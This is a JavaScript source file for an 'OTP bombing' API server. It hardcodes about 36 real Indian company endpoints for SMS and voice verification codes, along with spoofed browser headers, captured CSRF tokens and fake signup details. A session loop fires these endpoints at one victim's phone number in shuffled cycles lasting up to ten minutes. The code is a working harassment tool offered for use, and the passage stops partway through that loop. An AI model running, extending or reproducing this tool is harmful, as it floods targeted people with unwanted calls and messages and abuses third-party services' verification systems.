// ============================================================
// api_server.js - OTP Bombing API Server (v10.0)
// Random Shuffle + 1 Min Cycle + Parallel Sessions
// ============================================================

const express = require('express');
const axios = require('axios');
const cors = require('cors');
const http = require('http');
const https = require('https');
const dns = require('dns');

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// ============================================================
// ===== CONFIGURATION =====
// ============================================================

const MAX_EFFECTIVE_DURATION = 10;      // 10 min highest cap
const CYCLE_DURATION_MS = 60 * 1000;    // 1 min per cycle (poori API list)
const PER_API_TIMEOUT = 8000;           // 8s timeout per API
const LOG_CLEANUP_INTERVAL_MS = 2 * 60 * 1000;
const LOG_RETENTION_MS = 2 * 60 * 1000;

// ============================================================
// ===== CUSTOM AGENTS =====
// ============================================================

const httpAgent = new http.Agent({
    keepAlive: true,
    timeout: 8000,
    maxSockets: 50,
    maxFreeSockets: 10
});

const httpsAgent = new https.Agent({
    keepAlive: true,
    timeout: 8000,
    maxSockets: 50,
    maxFreeSockets: 10
});

function lookupWithTimeout(hostname, options, callback) {
    const lookupTimeout = setTimeout(() => {
        callback(new Error('DNS_TIMEOUT'));
    }, 3000);

    dns.lookup(hostname, options, (err, address, family) => {
        clearTimeout(lookupTimeout);
        callback(err, address, family);
    });
}

// ============================================================
// ===== LOG STORE =====
// ============================================================

class LogStore {
    constructor(retentionMs = LOG_RETENTION_MS) {
        this.logs = [];
        this.retentionMs = retentionMs;
    }

    add(level, message, meta = {}) {
        this.logs.push({
            timestamp: Date.now(),
            time: new Date().toISOString(),
            level,
            message,
            meta
        });
    }

    startCleanup() {
        setInterval(() => {
            const cutoff = Date.now() - this.retentionMs;
            const before = this.logs.length;
            this.logs = this.logs.filter(log => log.timestamp >= cutoff);
            const removed = before - this.logs.length;
            if (removed > 0) {
                console.log(`🧹 Log cleanup: ${removed} removed. Total: ${this.logs.length}`);
            }
        }, LOG_CLEANUP_INTERVAL_MS);
        console.log('✅ Log auto-cleanup started (every 2 min)');
    }

    getAll() { return this.logs; }
}

const logStore = new LogStore();

function logInfo(msg, meta) { console.log(`ℹ️  ${msg}`); logStore.add('info', msg, meta); }
function logSuccess(msg, meta) { console.log(`✅ ${msg}`); logStore.add('success', msg, meta); }
function logFail(msg, meta) { console.log(`❌ ${msg}`); logStore.add('fail', msg, meta); }
function logWarn(msg, meta) { console.log(`⚠️  ${msg}`); logStore.add('warn', msg, meta); }
function logError(msg, meta) { console.error(`🔥 ${msg}`); logStore.add('error', msg, meta); }

// ============================================================
// ===== ACTIVE SESSIONS =====
// ============================================================

const activeSessions = new Map();
let sessionCounter = 0;

// ============================================================
// ===== APIs (Sirf Working 36) =====
// ============================================================

const APIS = [
    // ===== VOICE APIs =====
    {
        name: "Tata Capital Voice",
        url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone, isOtpViaCallAtLogin: "true" })
    },
    {
        name: "1MG Voice",
        url: "https://www.1mg.com/auth_api/v6/create_token",
        method: "POST",
        headers: { "Content-Type": "application/json; charset=utf-8" },
        data: (phone) => JSON.stringify({ number: phone, otp_on_call: true })
    },
    {
        name: "Swiggy Voice",
        url: "https://profile.swiggy.com/api/v3/app/request_call_verification",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "Paytm Voice",
        url: "https://accounts.paytm.com/signin/voice-otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone: phone })
    },
    {
        name: "Uber Voice",
        url: "https://auth.uber.com/v2/voice-otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone: `+91${phone}` })
    },

    // ===== SMS APIs =====
    {
        name: "Unacademy",
        method: "POST",
        url: "https://unacademy.com/api/v3/user/user_check/",
        headers: {
            "accept": "*/*",
            "authorization": "Bearer undefined",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/json",
            "origin": "https://unacademy.com",
            "referer": "https://unacademy.com/login"
        },
        data: { "phone": "{phone}", "country_code": "IN", "otp_type": 1, "email": "", "send_otp": true, "is_un_teach_user": false }
    },
    {
        name: "Ajio_2",
        method: "POST",
        url: "https://login.web.ajio.com/api/auth/signupSendOTP",
        headers: {
            "accept": "application/json",
            "Origin": "https://www.ajio.com",
            "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/json",
            "Referer": "https://www.ajio.com/signup"
        },
        data: {
            "firstName": "Tsunami Bomber",
            "login": "tsunami@gmail.com",
            "password": "kd34646@3131nxnxn",
            "genderType": "",
            "mobileNumber": "{phone}",
            "requestType": "SENDOTP"
        }
    },
    {
        name: "Paytm",
        method: "POST",
        url: "https://accounts.paytm.com/v2/api/register",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Origin": "https://accounts.paytm.com",
            "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "Content-Type": "application/json",
            "Referer": "https://accounts.paytm.com/"
        },
        data: {
            "email": "",
            "mobile": "{phone}",
            "loginPassword": "Pura@1090",
            "csrfToken": "f7ea628c-91a2-5f14-82ca-6f7eee295b1d",
            "redirectUri": "https://paytm.com/v1/api/authresponse",
            "clientId": "paytm-web-secure",
            "scope": "paytm",
            "state": "",
            "responseType": "code",
            "theme": "mp-html5",
            "dob_agreement": true
        }
    },
    {
        name: "BookMyShow_1",
        method: "POST",
        url: "https://in.bookmyshow.com/pwa/api/uapi/otp/send",
        headers: {
            "accept": "application/json",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/json",
            "origin": "https://in.bookmyshow.com",
            "referer": "https://in.bookmyshow.com/"
        },
        data: { "channel": "phone", "subChannel": "sms", "details": { "phone": "{phone}", "origin": "https://in.bookmyshow.com" } }
    },
    {
        name: "Flipkart_2",
        method: "GET",
        url: "https://img1a.flixcart.com/batman-returns/batman-returns/p/images/logo_lite-cbb357.png",
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "Accept": "*/*",
            "Referer": "https://www.flipkart.com/login/verify?type=mobile&verificationType=otp&loginIdentifier={phone}&loginIdentifierPrefix=%2B91&sourceContext=default"
        }
    },
    {
        name: "Grofers",
        method: "POST",
        url: "https://grofers.com/v2/accounts/",
        headers: {
            "lon": "77.040489",
            "device_id": "a11f656b-422e-4617-953b-c350d517467d",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "auth_key": "57546838840176547788289acae69dd58e49de36b8d924c34e4310ec45824e13",
            "app_client": "consumer_web",
            "lat": "28.4465616",
            "content-type": "application/x-www-form-urlencoded",
            "accept": "*/*",
            "origin": "https://grofers.com",
            "referer": "https://grofers.com/"
        },
        data: { "_raw": "user_phone={phone}" }
    },
    {
        name: "UrbanClap",
        method: "POST",
        url: "https://www.urbanclap.com/api/v2/growth/profile/generateOTP",
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/json;charset=UTF-8",
            "accept": "application/json, text/plain, */*",
            "x-device-os": "web",
            "x-version-name": "web_v4.137.2",
            "origin": "https://www.urbancompany.com"
        },
        data: {
            "country_id": "IND",
            "phone": { "isd_code": "+91", "phone_wo_isd": "{phone}" },
            "device_type": "customer"
        }
    },
    {
        name: "Zee5",
        method: "GET",
        url: "https://b2bapi.zee5.com/device/sendotp_v1.php?phoneno={phone}",
        headers: {
            "accept": "*/*",
            "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "Origin": "https://www.zee5.com",
            "Referer": "https://www.zee5.com/"
        }
    },
    {
        name: "AakashDigital_2",
        method: "POST",
        url: "https://digital.aakash.ac.in/signup-otp-verify",
        headers: {
            "accept": "*/*",
            "origin": "https://digital.aakash.ac.in",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "referer": "https://digital.aakash.ac.in/user/register"
        },
        data: { "_raw": "&mobileval={phone}" }
    },
    {
        name: "RedBus_1",
        method: "GET",
        url: "https://m.redbus.in/api/getOtp?number={phone}&cc=91&whatsAppOpted=undefined",
        headers: {
            "accept": "application/json, text/plain, */*",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "referer": "https://m.redbus.in/preregister"
        }
    },
    {
        name: "Banggood",
        method: "POST",
        url: "https://m.banggood.in/index.php?com=login&t=sendMtSms&c=api",
        headers: {
            "accept": "application/json",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://m.banggood.in",
            "referer": "https://m.banggood.in/login.html"
        },
        data: { "_raw": "mobilePhone={phone}&countryPhoneCode=91&type=1&verifyCode=KmUu" }
    },
    {
        name: "Doubtnut",
        method: "POST",
        url: "https://doubtnut.com/api/v1/user/login",
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded",
            "accept": "*/*",
            "origin": "https://doubtnut.com",
            "referer": "https://doubtnut.com/login"
        },
        data: { "_raw": "phone={phone}" }
    },
    {
        name: "Dream11_1",
        method: "POST",
        url: "https://www.dream11.com/graphql/mutation/pwa/register",
        headers: {
            "accept": "*/*",
            "device": "pwa",
            "x-csrf": "fb1f1947-4547-392d-9a28-a9de30d9e766",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/json",
            "origin": "https://www.dream11.com",
            "referer": "https://www.dream11.com/register?ru="
        },
        data: {
            "query": "mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) { message }}",
            "variables": { "email": "tsunami@gmail.com", "mobileNumber": "{phone}", "password": "tsunami@123astronomia" }
        }
    },
    {
        name: "Zomato_1",
        method: "POST",
        url: "https://www.zomato.com/webroutes/auth/login",
        headers: {
            "x-zomato-csrft": "a6b0c09972b2bdd30c9c1b6552caee5d",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/json",
            "accept": "*/*",
            "origin": "https://www.zomato.com",
            "referer": "https://www.zomato.com/kanpur"
        },
        data: { "country_id": 1, "phone": "{phone}", "verification_type": "sms", "method": "phone" }
    },
    {
        name: "AakashDigital_1",
        method: "POST",
        url: "https://digital.aakash.ac.in/mkt-signup-otp-verify",
        headers: {
            "accept": "*/*",
            "origin": "https://digital.aakash.ac.in",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "referer": "https://digital.aakash.ac.in/"
        },
        data: { "_raw": "&mobileval={phone}&otp=6230" }
    },
    {
        name: "Limeroad",
        method: "POST",
        url: "https://www.limeroad.com/auth/get_uuid_v2?ajax=true&ret=https://www.limeroad.com/myaccount/orders?ajax=true&mobileOnly=false&doAction=",
        headers: {
            "origin": "https://www.limeroad.com",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/x-www-form-urlencoded",
            "accept": "*/*",
            "referer": "https://www.limeroad.com/"
        },
        data: { "_raw": "utf8=%E2%9C%93&authenticity_token=6686Dtpby7plpvjXr5%2Fe8oyPdiQ3Weta9Y9ydzSRP64%3D&user_id={phone}" }
    },
    {
        name: "Lenskart_1",
        method: "POST",
        url: "https://api.lenskart.com/v2/customers/sendOtp",
        headers: {
            "origin": "https://www.lenskart.com",
            "x-b3-traceid": "991600776345288",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/json;charset=UTF-8",
            "accept": "application/json, text/plain, */*",
            "x-session-token": "3bcac6f3-bda5-4370-8dc1-eebd8274b399",
            "x-api-client": "mobilesite",
            "referer": "https://www.lenskart.com/customer/account/login"
        },
        data: { "telephone": "{phone}" }
    },
    {
        name: "Vedantu",
        method: "POST",
        url: "https://user.vedantu.com/user/preLoginVerification",
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/json",
            "accept": "*/*",
            "origin": "https://www.vedantu.com",
            "referer": "https://www.vedantu.com/"
        },
        data: { "email": null, "phoneCode": "+91", "phoneNumber": "{phone}", "ver": "11.345" }
    },
    {
        name: "Ajio_1",
        method: "POST",
        url: "https://login.web.ajio.com/api/auth/accountCheck",
        headers: {
            "accept": "application/json",
            "Origin": "https://www.ajio.com",
            "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/json",
            "Referer": "https://www.ajio.com/signup"
        },
        data: { "emailId": "tsunami@gmail.com" }
    },
    {
        name: "Gaana",
        method: "POST",
        url: "https://jsso1.indiatimes.com/sso/crossapp/identity/native/registerOnlyMobile",
        headers: {
            "appVersion": "8.9.0",
            "CONTENT_TYPE": "application/json",
            "channel": "gaana.com",
            "tgid": "j9qcq0z2ur4llq2a58qqmag2",
            "sdkVersion": "1.0",
            "appVersionCode": "933",
            "deviceId": "j9qcq0z2ur4llq2a58qqmag2",
            "platform": "android",
            "sdkVersionCode": "1",
            "Content-Type": "application/json; charset=utf-8",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/O11019)",
            "Connection": "Keep-Alive"
        },
        data: { "mobile": "91-{phone}" }
    },
    {
        name: "Ullu",
        method: "POST",
        url: "https://ullu.app/ulluCore/api/v1/otp/sendRegisterOTP?mobileNumber={phone}",
        headers: {
            "accept": "application/json, text/plain, */*",
            "origin": "https://ullu.app",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "referer": "https://ullu.app/"
        },
        data: {}
    },
    {
        name: "Snapdeal",
        method: "POST",
        url: "https://m.snapdeal.com/signupCompleteAjax",
        headers: {
            "xc": "eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In19",
            "h2": "true",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "xg": "eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In0sInVpZCI6eyJndWlkIjoiMWMwNzhhMTMtZGU1My00ZDRkLTkwOTgtNzFmM2JlOTY5YjJiIn19fHwxNjAwODEzMDIyNTk1",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "u": "160081122259159083",
            "accept": "*/*",
            "origin": "https://m.snapdeal.com",
            "referer": "https://m.snapdeal.com/signin"
        },
        data: { "_raw": "j_password=null&j_mobilenumber={phone}&agree=true&j_confpassword=null&journey=mobile&numberEdit=false&swp=true&j_fullname=uyuhyntuhy" }
    },
    {
        name: "Cuemath_1",
        method: "POST",
        url: "https://www.cuemath.com/api/v4/parents/",
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "Content-Type": "application/JSON",
            "Accept": "*/*",
            "Origin": "https://www.cuemath.com",
            "Referer": "https://www.cuemath.com/"
        },
        data: {
            "intl_mobile": { "phone": "" },
            "phone": "{phone}",
            "email": "nsbd@dn.djs",
            "full_name": "hdhdhdg",
            "place_id": "ChIJYYhT3gl3AjoRUDlkL1i5oIk",
            "timezone": "Asia/Calcutta",
            "detail_source": "CMO_2020",
            "form_fields": "full_name,phone,email,place_id"
        }
    },
    {
        name: "Swiggy",
        method: "POST",
        url: "https://www.swiggy.com/mapi/auth/signup",
        headers: {
            "origin": "https://www.swiggy.com",
            "__fetch_req__": "true",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/json",
            "accept": "*/*",
            "referer": "https://www.swiggy.com/auth/register"
        },
        data: {
            "name": "dbdbdbd",
            "email": "tsunami@gmail.com",
            "password": "sndndndbdj283jsbsbs",
            "referral_code": "",
            "mobile": "{phone}",
            "_csrf": "jK7JY3E9u8xJ-1Q_DUwsGnPDhccbB4rGz0dKIbfk"
        }
    },
    {
        name: "Cilory",
        method: "POST",
        url: "https://www.cilory.com/app/w/auth/soft",
        headers: {
            "accept": "application/json",
            "origin": "https://www.cilory.com",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/json;charset=UTF-8",
            "referer": "https://www.cilory.com/authentication"
        },
        data: { "mobile": "{phone}" }
    },
    {
        name: "Quikr",
        method: "POST",
        url: "https://www.quikr.com/core/sendOtp?_t=0e2ed2ef8cff0015a917b9cf98ccaea3",
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "accept": "*/*",
            "origin": "https://www.quikr.com",
            "referer": "https://www.quikr.com/"
        },
        data: { "_raw": "user={phone}&v3=true" }
    },
    {
        name: "Flipkart_1",
        method: "POST",
        url: "https://1.rome.api.flipkart.com/1/action/view",
        headers: {
            "x-user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5FKUA/msite/0.0.3/msite/Mobile",
            "Origin": "https://www.flipkart.com",
            "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/json",
            "Accept": "*/*",
            "Referer": "https://www.flipkart.com/login"
        },
        data: {
            "actionRequestContext": {
                "type": "LOGIN_IDENTITY_VERIFY",
                "loginIdPrefix": "+91",
                "loginId": "{phone}",
                "clientQueryParamMap": { "ret": "/?affid=siteplug&affExtParam1=e2f29ff2e3dd9e65eb9e419d30dc8135", "entryPage": "HOMEPAGE_HEADER_ACCOUNT" },
                "loginType": "MOBILE",
                "verificationType": "OTP",
                "screenName": "LOGIN_V4_MOBILE",
                "sourceContext": "DEFAULT"
            }
        }
    },
    {
        name: "Ogonn",
        method: "POST",
        url: "https://ogonn.in/otp",
        headers: {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "origin": "https://ogonn.in",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "referer": "https://ogonn.in/login"
        },
        data: { "_raw": "_token=I10LMVWBAN1c30T8SbgVHHvlKFTgTU1iFTm7hlfl&mobile={phone}" }
    },
    {
        name: "Careers360",
        method: "POST",
        url: "https://www.careers360.com/ajax/no-cache/user/otp-send",
        headers: {
            "Accept": "*/*",
            "X-CSRFToken": "9tKY96jb358WKiZBMwhz2EcranwljWDbxdqrQCnvqQWXNGbIvtfEQQLCbrzA8ssj",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; vivo 1818) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.careers360.com",
            "Referer": "https://www.careers360.com/"
        },
        data: { "_raw": "mobile_number={phone}&method=call&uid=12692588" }
    },
    {
        name: "GetInstaCash",
        method: "POST",
        url: "https://getinstacash.in/sell/getData.php",
        headers: {
            "Accept": "*/*",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://getinstacash.in",
            "Referer": "https://getinstacash.in/sell/login"
        },
        data: { "_raw": "type=sendOTP&mobile={phone}" }
    },
    {
        name: "Netmeds",
        method: "GET",
        url: "https://m.netmeds.com/mst/rest/v1/id/details/{phone}",
        headers: {
            "accept": "application/json, text/plain, */*",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "referer": "https://m.netmeds.com/customer/account/login"
        }
    }
];

logSuccess(`Loaded ${APIS.length} working APIs (random shuffle mode)`);

// ============================================================
// ===== SHUFFLE FUNCTION (Fisher-Yates) =====
// ============================================================

function shuffleArray(array) {
    const shuffled = [...array];
    for (let i = shuffled.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
    }
    return shuffled;
}

// ============================================================
// ===== API CALL FUNCTION =====
// ============================================================

async function makeApiCall(api, phone, timeoutMs = PER_API_TIMEOUT) {
    const startTime = Date.now();
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), timeoutMs);

    try {
        let url = api.url;
        if (typeof url === 'function') url = url(phone);
        else if (url.includes('{phone}')) url = url.replace(/{phone}/g, phone);

        const headers = { ...(api.headers || {}) };
        delete headers['content-length'];
        delete headers['Content-Length'];
        delete headers['host'];
        delete headers['Host'];

        let data = null;
        let isRaw = false;

        if (api.data) {
            if (typeof api.data === 'function') {
                data = api.data(phone);
            } else if (api.data._raw) {
                let rawData = api.data._raw;
                if (typeof rawData === 'string') rawData = rawData.replace(/{phone}/g, phone);
                data = rawData;
                isRaw = true;
            } else {
                data = JSON.parse(JSON.stringify(api.data));
                const replacePhone = (obj) => {
                    if (typeof obj === 'string') return obj.replace(/{phone}/g, phone);
                    if (Array.isArray(obj)) return obj.map(replacePhone);
                    if (typeof obj === 'object' && obj !== null) {
                        const newObj = {};
                        for (let key in obj) newObj[key] = replacePhone(obj[key]);
                        return newObj;
                    }
                    return obj;
                };
                data = replacePhone(data);
            }
        }

        const method = (api.method || 'POST').toLowerCase();
        const config = {
            method,
            url,
            headers,
            timeout: timeoutMs,
            maxRedirects: 3,
            validateStatus: () => true,
            signal: controller.signal,
            httpAgent,
            httpsAgent,
            lookup: lookupWithTimeout
        };

        if (method === 'post' || method === 'put') {
            if (isRaw || typeof data === 'string') {
                config.data = data;
                if (typeof data === 'string' && data.includes('=') && !data.startsWith('{')) {
                    headers['Content-Type'] = 'application/x-www-form-urlencoded';
                }
            } else if (data) {
                config.data = JSON.stringify(data);
                if (!headers['Content-Type']) headers['Content-Type'] = 'application/json';
            }
        }

        const response = await axios(config);
        clearTimeout(timeoutId);

        const responseTime = Date.now() - startTime;
        const success = response.status >= 200 && response.status < 300;
        return { success, status: response.status, responseTime };

    } catch (err) {
        clearTimeout(timeoutId);
        return {
            success: false,
            status: null,
            responseTime: Date.now() - startTime,
            error: err.message
        };
    }
}

// ============================================================
// ===== BOMBING SESSION (RANDOM SHUFFLE + 1 MIN CYCLE) =====
// ============================================================

async function runBombingSession(sessionId, phone, durationMinutes) {
    const session = activeSessions.get(sessionId);
    if (!session) return;

    const startTime = Date.now();
    const endTime = startTime + (durationMinutes * 60 * 1000);

    logInfo(`⚔️  SESSION ${sessionId} START | Phone: ${phone} | Duration: ${durationMinutes}min`);
    logInfo(`🎲 SESSION ${sessionId} | Random shuffle mode: har cycle me naya order`);

    while (Date.now() < endTime && activeSessions.has(sessionId)) {
        session.cycleCount++;
        const cycleNum = session.cycleCount;

        // 🔥 RANDOM SHUFFLE — har cycle me naya order
        const shuffledApis = shuffleArray(APIS);

        logInfo(`🔄 SESSION ${sessionId} | Cycle #${cycleNum} START | ${shuffledApis.length} APIs (random order, spread over 1 min)`);

        // 🔥 Calculate delay between APIs to spread over 1 min
        // Total 60s / 36 APIs = ~1666ms per API
        const totalApis = shuffledApis.length;
        const delayPerApi = Math.floor(CYCLE_DURATION_MS / totalApis);

        const cycleStartTime = Date.now();

        for (let i = 0; i < totalApis; i++) {
            // Check session still active
            if (!activeSessions.has(sessionId)) break;

            const api = shuffledApis[i];
            const result = await makeApiCall(api, phone, PER_API_TIMEOUT);

            if (result.success) {
                session.successCount++;
                logSuccess(`[${sessionId}] Cycle #${cycleNum} | [${i + 1}/${totalApis}] ${api.name} → ${result.status} (${result.responseTime}ms)`);
            } else {
                session.failCount++;
                const statusText = result.status ? ` → ${result.status}` : ' → FAIL';
                logFail(`[${sessionId}] Cycle #${cycleNum} | [${i + 1}/${totalApis}] ${api.name}${statusText} (${result.responseTime}ms)`);
            }

            // 🔥 Delay to spread over 1 min
            if (i < totalApis - 1) {
                const elapsed = Date.now() - cycleStartTime;
                const expectedTime = (i + 1) * delayPerApi;
                const waitTime = Math.max(0, expectedTime - elapsed);

                if (waitTime > 0) {
                    await new Promise(r => setTimeout(r, waitTime));
                }
            }
        }

        const cycleElapsed = ((Date.now() - cycleStartTime) / 1000).toFixed(1);
        logInfo(`✅ SESSION ${sessionId} | Cycle #${cycleNum} COMPLETE in ${cycleElapsed}s | Success: ${session.successCount} | Fail: ${session.failCount}`);

        // Wait for next cycle (agar 1 min se kam me complete hua)
        const remainingTime = CYCLE_DURATION_MS - (Date.now() - cycleStartTime);
        if (remainingTime > 0 && Date.now() < endTime && activeSessions.has(sessionId)) {
            await new Promise(r => setTimeout(r, remainingTime));
        }
    }

